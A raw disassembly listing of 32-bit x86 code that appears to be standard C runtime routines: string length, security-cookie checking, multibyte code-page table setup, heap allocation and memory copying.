  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
